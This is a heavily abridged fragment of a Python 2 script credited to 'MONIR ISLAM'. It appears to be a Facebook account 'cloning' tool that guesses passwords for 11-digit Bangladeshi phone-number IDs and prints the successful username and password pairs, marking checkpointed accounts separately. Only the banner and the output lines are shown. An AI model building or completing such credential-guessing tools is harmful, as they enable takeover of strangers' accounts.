...
psb('\x1b[1;32mBANGLADESH MONIR 11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : MONIR ISLAM'

    print 'FACEBOOK : https://www.facebook.com/hafezmonirul1'

    print 'GITHUB     : github.com/TERMUXMONIR'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[MONIR-OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[MONIR-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
